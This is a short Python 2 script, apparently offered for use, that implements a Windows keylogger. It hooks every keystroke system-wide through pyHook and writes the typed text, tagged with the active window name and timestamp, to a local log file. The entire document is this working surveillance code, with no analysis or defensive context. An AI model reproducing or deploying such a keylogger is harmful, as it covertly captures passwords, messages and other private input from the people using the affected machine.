import pyHook, pythoncom, sys, logging

file_log = 'C:\Users\Nitesh\Documents\keyloggeroutput.txt' #This could be your own location of log file
window_name = ''
time = 0
keylog = ''
# Function for logging keys
def OnKeyboardEvent(event):
    global window_name
    global time
    global keylog
    global file_log
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    print event.Time - time
    if  window_name == event.WindowName and event.Time - time < 10000:
        keylog += chr(event.Ascii)
    else:
        window_name = event.WindowName
        time = event.Time
        logging.log(10, keylog)
        keylog = "Window Name: " + str(window_name) + "::Time: " + str(time) + "::LOG: " + chr(event.Ascii)
        
    return True
    
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
